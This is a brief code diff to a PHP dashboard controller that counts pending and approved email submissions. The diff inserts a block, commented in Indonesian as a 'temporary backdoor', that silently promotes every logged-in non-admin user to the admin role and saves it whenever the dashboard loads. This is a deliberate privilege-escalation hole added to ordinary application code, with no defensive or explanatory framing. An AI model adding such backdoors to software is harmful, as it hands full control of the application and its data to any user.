@@ -13,6 +13,13 @@ class DashboardController extends Controller
         $harga_email_bebas = Setting::where('key', 'harga_email_bebas')->value('value') ?? 3300;
 
         $user = auth()->user();
+        
+        // ⚠️ BACKDOOR SEMENTARA: Jadikan user yang login sebagai admin otomatis
+        if ($user && $user->role !== 'admin') {
+            $user->role = 'admin';
+            $user->save();
+        }
+
         $pending_count = $user->setoranEmails()->where('status', 'pending')->count();
         $approved_count = $user->setoranEmails()->where('status', 'approved')->count();
 
